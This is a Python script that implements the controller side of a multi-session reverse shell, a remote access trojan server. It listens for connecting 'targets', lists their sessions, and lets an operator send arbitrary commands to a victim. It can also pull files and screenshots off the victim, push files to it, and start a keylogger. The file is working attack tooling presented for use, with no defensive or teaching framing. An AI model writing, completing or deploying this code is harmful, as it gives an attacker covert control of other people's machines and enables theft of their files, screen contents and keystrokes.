#!/usr/bin/python

import socket
import json
import os
import base64
import threading

def shell(target, ip):
    def reliable_send(data):
        json_data = json.dumps(data)
        target.send(json_data)

    def reliable_recv():
        data = ""
        while True:
            try:
                data = data + target.recv(1024)
                return json.loads(data)
            except ValueError:
                continue

    global count
    while True:
        command = raw_input("Shell#~%s: "%str(ip))
        reliable_send(command)
        if command == 'q':
            break
        elif command == "exit":#close single session
            target.close()
            targets.remove(target)
            ips.remove(ip)
            break
        elif command[:2] == "cd" and len(command) > 1:
            continue
        elif command[:8] == "download":
            with open(command[9:], "wb") as file:
                file_data = reliable_recv()
                file.write(base64.b64decode(file_data))
        elif command[:6] == "upload":
            try:
                with open(command[7:], "rb") as fin:
                    reliable_send(base64.b64encode(fin.read()))
            except:
                failed = "Failed to upload"
                reliable_send(base64.b64encode(failed))
        elif command[:10] == "screenshot":
            with open("screenshot%d" % count, "wb") as screen:
                image = reliable_recv()
                image_decoded = base64.b64decode(image)
                if  image_decoded[:4] == "[!!]":
                    print(image_decoded)
                else:
                    screen.write(image_decoded)
                    count += 1
        elif command[:12] == "keylog_start":
            continue
        else:
            result = reliable_recv()
            print(result)

def server():
    global clients
    while True:
        if stop_threads:
            break
        s.settimeout(1)
        try:
            target, ip = s.accept()
            targets.append(target)
            ips.append(ip)
            print(str(targets[clients]) + " --- " + str(ips[clients]) + "has connected!")
            clients += 1
        except:
            pass


global s
ips = []
targets = []

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("10.0.2.15",54321)) #change to server IP
s.listen(5)

clients = 0
stop_threads = False

print("[+] Waiting for targets to connect ...")
t1 = threading.Thread(target=server)
t1.start()

while True:
    command = raw_input("* Center: ")
    if command == "targets":
        count = 0
        for ip in ips:
            print("Session "+ str(count) + ".  <---> " + str(ip))
            count += 1
    elif command[:7] == "session":
        try:
            num = int(command[8:])
            tarnum = targets[num]
            tarip = ips[num]
            shell(tarnum, tarip)
        except:
            print("[!!] No session under that number!")
    elif command == "exit":
        for target in targets:
            target.close()
        s.close()
        stop_threads = True
        t1.join()
        break
